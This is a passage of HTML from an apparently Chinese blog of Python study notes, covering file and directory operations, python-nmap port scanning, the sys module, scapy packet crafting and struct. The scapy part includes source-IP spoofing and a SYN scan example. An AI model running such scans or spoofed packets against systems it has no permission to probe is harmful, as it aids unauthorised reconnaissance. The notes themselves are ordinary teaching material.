class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w 写方式</span><br><span class=\"line\">a 追加模式打开（从EOF开始，必要时创建新文件）</span><br><span class=\"line\">r+ 以读写模式打开</span><br><span class=\"line\">w+ 以读写模式打开</span><br><span class=\"line\">a+ 以读写模式打开</span><br><span class=\"line\">rb 以二进制读模式打开</span><br><span class=\"line\">wb 以二进制写模式打开 (参见 w )</span><br><span class=\"line\">ab 以二进制追加模式打开 (参见 a )</span><br><span class=\"line\">rb+ 以二进制读写模式打开 (参见 r+ )</span><br><span class=\"line\">wb+ 以二进制读写模式打开 (参见 w+ )</span><br><span class=\"line\">ab+ 以二进制读写模式打开 (参见 a+ )</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fp.read([size])  #size为读取的长度，以byte为单位</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.readline([size])  #读一行，如果定义了size，有可能返回的只是一行的一部分</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.readlines([size])  #把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.write(str)  #把str写到文件中，write()并不会在str后加上一个换行符</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.writelines(seq)  #把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.close()  #关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.flush()  #把缓冲区的内容写入硬盘</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.fileno()  #返回一个长整型的”文件标签“</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.isatty()  #文件是否是一个终端设备文件（unix系统中的）</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.tell()  #返回文件操作标记的当前位置，以文件的开头为原点</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.next()  #返回下一行，并将文件操作标记位移到下一行。把一个file用于<span class=\"keyword\">for</span> … <span class=\"keyword\">in</span> file这样的语句时，就是调用next()函数来实现遍历的。</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.seek(offset[,whence])  #将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为<span class=\"number\">0</span>表示从头开始计算，<span class=\"number\">1</span>表示以当前位置为原点计算。<span class=\"number\">2</span>表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。</span><br><span class=\"line\"> </span><br><span class=\"line\">fp.truncate([size])  #把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用<span class=\"number\">0</span>把文件补到相应的大小，也可能是以一些随机的内容加上去。</span><br><span class=\"line\"> </span><br><span class=\"line\">目录操作</span><br><span class=\"line\"> </span><br><span class=\"line\">os.<span class=\"built_in\">mkdir</span>(&quot;file&quot;)　　创建目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copyfile(&quot;oldfile&quot;,&quot;newfile&quot;)　　复制文件:oldfile和newfile都只能是文件</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.<span class=\"built_in\">copy</span>(&quot;oldfile&quot;,&quot;newfile&quot;)  oldfile只能是文件夹，newfile可以是文件，也可以是目标目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.copytree(&quot;olddir&quot;,&quot;newdir&quot;)  复制文件夹.olddir和newdir都只能是目录，且newdir必须不存在</span><br><span class=\"line\"> </span><br><span class=\"line\">os.<span class=\"built_in\">rename</span>(&quot;oldname&quot;,&quot;newname&quot;)  重命名文件（目录）.文件或目录都是使用这条命令</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.<span class=\"built_in\">move</span>(&quot;oldpos&quot;,&quot;newpos&quot;)  移动文件（目录）</span><br><span class=\"line\"> </span><br><span class=\"line\">os.<span class=\"built_in\">rmdir</span>(&quot;<span class=\"built_in\">dir</span>&quot;)  只能删除空目录</span><br><span class=\"line\"> </span><br><span class=\"line\">shutil.rmtree(&quot;<span class=\"built_in\">dir</span>&quot;)  空目录、有内容的目录都可以删</span><br><span class=\"line\"> </span><br><span class=\"line\">os.<span class=\"built_in\">chdir</span>(&quot;<span class=\"built_in\">path</span>&quot;)  转换目录，换路径</span><br></pre></td></tr></table></figure>\n<h2 id=\"nmap\"><a class=\"markdownIt-Anchor\" href=\"#nmap\">#</a> <strong>nmap</strong></h2>\n<p><strong>这里我们主要接受 python-nmap 模块的两个常用类，一个是 PortScanner () 类，实现一个 nmap 工具的端口扫描功能封装；另一个为 PortScannerHostDict () 类，实现存储与访问主机扫描结果</strong></p>\n<p><strong>1、PortScanner () 类常用方法</strong><br>\n<strong> 1-1、scan () 方法</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scan(self, hosts=&#x27;127.0.0.1&#x27;, ports=None, arguments=&#x27;-sV&#x27;)</span><br></pre></td></tr></table></figure>\n<p><strong>方法，实现指定主机、端口、namp 命令行参数的扫描。参数 hosts 为字符串类型，表示扫描的主机地址，格式可以用 &quot;<span class=\"exturl\" data-url=\"aHR0cDovL3NjYW5tZS5ubWFwLm9yZw==\">scanme.nmap.org</span>&quot;、“192.116.0-255.1-127”、“216.163.128.20/20&quot; 表示；参数 ports 为字符串类型，表示扫描的端口，可以用 &quot;22,53,110,143-4564&quot; 表示；参数 namp 命令行参数，格式为”-sU -sX -sC&quot;，例如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nm = nmap.PortScanner()</span><br><span class=\"line\">nm.scan(&#x27;192.168.209.121-122&#x27;, &#x27;22,80&#x27;)</span><br></pre></td></tr></table></figure>\n<p><strong>1-2、command_line () 方法</strong><br>\n<strong> command_line (self) 方法，返回的扫描方法映射到具体的 nmap 命令行，如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm.command_line()</span><br><span class=\"line\">u&#x27;nmap -oX - -p 22,80 -sV 192.168.209.121-122&#x27;</span><br></pre></td></tr></table></figure>\n<p><strong>1-3、scaninfo () 方法</strong><br>\n<strong> scaninfo (self) 方法，返回 nmap 扫描信息，格式为字典类型，如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;nm.scanninfo()</span><br><span class=\"line\">&#123;&#x27;tcp&#x27;:&#123;&#x27;services&#x27;:&#x27;22,80&#x27;, &#x27;method&#x27;:&#x27;syn&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>1-4、all_hosts () 方法</strong><br>\n<strong> all_hosts (self) 方法，返回 nmap 扫描的主机清单，格式为列表类型，例如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&#x27;192.168.209.121&#x27;, &#x27;192.168.209.122&#x27;]</span><br></pre></td></tr></table></figure>\n<p><strong>2、PortScannerHostDict () 类常用方法</strong><br>\n<strong> 2-1、hostname () 方法</strong><br>\n<strong> hostname (self) 方法，返回扫描对象的主机名，如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm[&#x27;192.168.209.121&#x27;].hostname()</span><br></pre></td></tr></table></figure>\n<p><strong>’liuyazhuang’</strong><br>\n<strong>2-2、state () 方法</strong><br>\n<strong> state (self) 方法，返回扫描对象的状态，包括 4 中状态 (up、down、unknown、skipped)，如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm[&#x27;192.168.209.121&#x27;].state()</span><br></pre></td></tr></table></figure>\n<p><strong>’up’</strong><br>\n<strong>2-3、all_protocols () 方法</strong><br>\n<strong> all_protocols (self) 方法，返回扫描的协议，如:</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm[&#x27;192.168.209.121&#x27;].all_protocols()</span><br></pre></td></tr></table></figure>\n<p><strong>[‘tcp’]</strong><br>\n<strong> 2-4、all_tcp () 方法</strong><br>\n<strong> all_tcp (self) 方法，返回 TCP 协议扫描的端口，如：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm[&#x27;192.168.209.121&#x27;].all_tcp()</span><br></pre></td></tr></table></figure>\n<p><strong>[22,80]</strong><br>\n<strong> 2-5、tcp () 方法</strong><br>\n<strong> tcp (self, port) 方法，返回扫描 TCP 协议 port (端口) 的信息，如:</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; nm[&#x27;192.168.209.121&#x27;].tcp(22)</span><br><span class=\"line\">&#123;&#x27;state&#x27;:&#x27;open&#x27;, &#x27;reason&#x27;:&#x27;syn-ack&#x27;, &#x27;name&#x27;:&#x27;ssh&#x27;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"sys模块-2\"><a class=\"markdownIt-Anchor\" href=\"#sys模块-2\">#</a> <strong>sys 模块</strong></h2>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">sys.argv: 实现从程序外部向程序传递参数。</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.exit</span>([<span class=\"title\">arg</span>]): 程序中间的退出，<span class=\"title\">arg</span>=0为正常退出。</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.getdefaultencoding</span>(): 获取系统当前编码，一般默认为<span class=\"title\">ascii</span>。</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.setdefaultencoding</span>(): 设置系统默认编码，执行<span class=\"title\">dir</span>（<span class=\"title\">sys</span>）时不会看到这个方法，在解释器中执行不通过，可以先执行<span class=\"title\">reload</span>(<span class=\"title\">sys</span>)，在执行 <span class=\"title\">setdefaultencoding</span>(&#x27;<span class=\"title\">utf8</span>&#x27;)，此时将系统默认编码设置为<span class=\"title\">utf8</span>。（见设置系统默认编码 ）</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.getfilesystemencoding</span>(): 获取文件系统使用编码方式，<span class=\"title\">Windows</span>下返回&#x27;<span class=\"title\">mbcs</span>&#x27;，<span class=\"title\">mac</span>下返回&#x27;<span class=\"title\">utf</span>-8&#x27;.</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.path</span>: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中<span class=\"title\">import</span>时正确找到。</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.platform</span>: 获取当前系统平台。</span></span><br><span class=\"line\"><span class=\"function\"> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">sys.stdin</span>,<span class=\"title\">sys.stdout</span>,<span class=\"title\">sys.stderr</span>: <span class=\"title\">stdin</span> , <span class=\"title\">stdout</span> , 以及<span class=\"title\">stderr</span> 变量包含与标准<span class=\"title\">I</span>/<span class=\"title\">O</span> 流对应的流对象. 如果需要更好地控制输出,而<span class=\"title\">print</span> 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( <span class=\"title\">device</span> ), 或者以非标准的方式处理它们</span></span><br></pre></td></tr></table></figure>\n<p><strong>sys.argv</strong></p>\n<p><strong>功能：在外部向程序内部传递参数</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115204741870.png\" alt=\"image-20201115204741870\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115204803153.png\" alt=\"image-20201115204803153\"></strong></p>\n<p><strong>sys.exit(n)</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">功能：执行到主程序末尾，解释器自动退出，但是如果需要中途退出程序，可以调用sys.exit函数，带有一个可选的整数参数返回给调用它的程序，表示你可以在主程序中捕获对sys.exit的调用。（0是正常退出，其他为异常）</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115205105004.png\" alt=\"image-20201115205105004\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115205120882.png\" alt=\"image-20201115205120882\"></strong></p>\n<p><strong>sys.modules</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">功能：sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。它拥有字典所拥有的一切方法。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115205328555.png\" alt=\"image-20201115205328555\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115205344454.png\" alt=\"image-20201115205344454\"></strong></p>\n<h2 id=\"scapy\"><a class=\"markdownIt-Anchor\" href=\"#scapy\">#</a> <strong>scapy</strong></h2>\n<p><strong>导入</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import *</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 使用Ether()方法生成一个以太网层数据包</span><br><span class=\"line\">eth_packet = Ether()</span><br><span class=\"line\"># 使用IP()方法生成一个网络层数据包</span><br><span class=\"line\">ip_packet = IP()</span><br><span class=\"line\"># 使用TCP()方法生成一个tcp数据包</span><br><span class=\"line\">tcp_packet = TCP()</span><br><span class=\"line\"># 使用UDP()方法生成一个udp数据包</span><br><span class=\"line\">udp_packet = UDP()</span><br><span class=\"line\"># 使用ICMP()方法生成一个udp数据包</span><br><span class=\"line\">icmp_packet = ICMP()</span><br></pre></td></tr></table></figure>\n<p><strong>上一小节中生成数据包，如果就长这样的话完全就是一个黑盒，我们需要一些方法来知道数据包（各字段）是什么内容。</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 使用IP()方法生成一个tcp数据包</span><br><span class=\"line\">ip_packet = IP()</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一、使用raw()方法查看</span><br><span class=\"line\">raw(ip_packet)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二、使用hexdump()查看。类似Wireshark</span><br><span class=\"line\">hexdump(ip_packet)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法三、raw()配合协议类查看。最佳</span><br><span class=\"line\"># 查看该数据包以太网层内容（下层内容不层示，上层内容不解析只以load形式展示）</span><br><span class=\"line\">Ether(raw(ip_packet))</span><br><span class=\"line\"># 查看该数据包网络层内容（下层内容不层示，上层内容不解析只以load形式展示）</span><br><span class=\"line\">IP(raw(ip_packet))</span><br></pre></td></tr></table></figure>\n<p><strong>上一小节中我们使用 raw 配合协议方法的方式清楚地看到了数据包中各字段的值，这些值是根据本机信息自动生成的，我们来看如何自定义各字段的值。</strong></p>\n<p><strong>定义字段的值有两个种方法，一种是在构造时直接传递参数，另一种是在生成后重新赋值；至于参数名即是上一小节中打出的那些项。</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip_packet = IP(src=&quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>&quot;,ttl=<span class=\"number\">128</span>)</span><br><span class=\"line\"># 查看数据包各项值，确认src项是否为<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>，ttl项是否为<span class=\"number\">128</span></span><br><span class=\"line\">IP(raw(ip_packet))</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二，在生成后重新赋值</span><br><span class=\"line\"># 给src赋值<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>，ttl赋值<span class=\"number\">128</span>；字段为字符的以字符串形式赋，字段为数值的以数值形式赋</span><br><span class=\"line\">ip_packet.src = &quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">93</span>&quot;</span><br><span class=\"line\">ip_packet.ttl = <span class=\"number\">200</span></span><br><span class=\"line\"># 查看数据包各项值，确认src项是否为<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">93</span>，ttl项是否为<span class=\"number\">200</span></span><br><span class=\"line\">IP(raw(ip_packet))</span><br></pre></td></tr></table></figure>\n<p><strong>构造多层协议，构造函数可使用 “/” 隔开，低层函数在前高层函数在后；最后使用构造函数中的最低层函数即可查看数据包内容。</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 构造一个IP数据包，源mac设置为&quot;<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">11</span>&quot;，源ip设置为&quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>&quot;</span><br><span class=\"line\">ip_packet = Ether(src=&quot;<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">11</span>&quot;)/IP(src=&quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>&quot;)</span><br><span class=\"line\"># 当前构造函中最低层为Ether</span><br><span class=\"line\">Ether(raw(ip_packet))</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个TCP数据包，源mac设置为&quot;<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">11</span>&quot;，源ip设置为&quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>&quot;，源端口设置为<span class=\"number\">1234</span></span><br><span class=\"line\">tcp_packet = Ether(src=&quot;<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">00</span>:<span class=\"number\">11</span>&quot;)/IP(src=&quot;<span class=\"number\">10</span>.<span class=\"number\">10</span>.<span class=\"number\">6</span>.<span class=\"number\">92</span>&quot;)/TCP(sport=<span class=\"number\">1234</span>)</span><br><span class=\"line\"># 当前构造函中最低层为Ether</span><br><span class=\"line\">Ether(raw(tcp_packet))</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个应用层数据包，应用层内容为&quot;GET / HTTP/<span class=\"number\">1</span>.<span class=\"number\">0</span>\\r\\n\\r\\n&quot;</span><br><span class=\"line\">app_packet = IP()/TCP()/&quot;GET / HTTP/<span class=\"number\">1</span>.<span class=\"number\">0</span>\\r\\n\\r\\n&quot;</span><br><span class=\"line\"># 当前构造函中最低层为IP</span><br><span class=\"line\">IP(raw(app_packet))</span><br></pre></td></tr></table></figure>\n<p><strong>send () 函数允许自定义网络层，sendp () 函数允许自定义以太网层。</strong></p>\n<p><strong>不管 TCP 还是 UDP 都一样直接使用 send () 等函数即可，scapy 会自己选择 socket 类型</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">send(IP(dst&#x3D;&quot;10.10.6.92&quot;)&#x2F;ICMP())</span><br><span class=\"line\"></span><br><span class=\"line\">sendp(Ether()&#x2F;IP(dst&#x3D;&quot;10.10.6.92&quot;)&#x2F;ICMP())</span><br></pre></td></tr></table></figure>\n<p><strong>sr1 () 函数参许自定义网络层，srp () 函数允许自定层数据链路层</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rec_packet &#x3D; sr1(IP(dst&#x3D;&quot;10.10.6.92&quot;)&#x2F;ICMP()&#x2F;&quot;abcdefg&quot;)</span><br><span class=\"line\">rec_packet</span><br><span class=\"line\"># 直接读取某项值</span><br><span class=\"line\">rec_packet.src</span><br><span class=\"line\"># 使用show()方法格式化输出</span><br><span class=\"line\">rec_packet.show()</span><br></pre></td></tr></table></figure>\n<p><strong>所谓 syn 扫描就是把 Flags 字段明确指定为 SYN</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rec_packet &#x3D; sr1(IP(dst&#x3D;&quot;10.10.6.92&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;))</span><br><span class=\"line\">rec_packet.show()</span><br></pre></td></tr></table></figure>\n<h2 id=\"struct模块\"><a class=\"markdownIt-Anchor\" href=\"#struct模块\">#</a> <strong>struct 模块</strong></h2>\n<h2 id=\"struct模块中的函数\"><a class=\"markdownIt-Anchor\" href=\"#struct模块中的函数\">#</a> <strong>struct 模块中的函数</strong></h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>函数</strong></th>\n<th style=\"text-align:left\"><strong>return</strong></th>\n<th style=\"text-align:left\"><strong>explain</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>pack(fmt,v1,v2…)</strong></td>\n<td style=\"text-align:left\"><strong>string</strong></td>\n<td style=\"text-align:left\"><strong>按照给定的格式 (fmt), 把数据转换成字符串 (字节流), 并将该字符串返回.</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>pack_into(fmt,buffer,offset,v1,v2…)</strong></td>\n<td style=\"text-align:left\"><strong>None</strong></td>\n<td style=\"text-align:left\"><strong>按照给定的格式 (fmt), 将数据转换成字符串 (字节流), 并将字节流写入以 offset 开始的 buffer 中.(buffer 为可写的缓冲区，可用 array 模块)</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>unpack(fmt,v1,v2……)</strong></td>\n<td style=\"text-align:left\"><strong>tuple</strong></td>\n<td style=\"text-align:left\"><strong>按照给定的格式 (fmt) 解析字节流，并返回解析结果</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>pack_from(fmt,buffer,offset)</strong></td>\n<td style=\"text-align:left\"><strong>tuple</strong></td>\n<td style=\"text-align:left\"><strong>按照给定的格式 (fmt) 解析以 offset 开始的缓冲区，并返回解析结果</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>calcsize(fmt)</strong></td>\n<td style=\"text-align:left\"><strong>size of fmt</strong></td>\n<td style=\"text-align:left\"><strong>计算给定的格式 (fmt) 占用多少字节的内存，注意对齐方式</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>struct 提供用 format specifier 方式对数据进行打包和解包（Packing and Unpacking）。例如:</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import struct</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">values = (<span class=\"number\">1</span>, &#x27;abc&#x27;, <span class=\"number\">2</span>.<span class=\"number\">7</span>)</span><br><span class=\"line\">s = struct.Struct(&#x27;I3sf&#x27;)</span><br><span class=\"line\">packed_data = s.pack(*values)</span><br><span class=\"line\">unpacked_data = s.unpack(packed_data)</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"built_in\">print</span> &#x27;Original values:&#x27;, values</span><br><span class=\"line\"><span class=\"built_in\">print</span> &#x27;<span class=\"built_in\">Format</span> string :&#x27;, s.<span 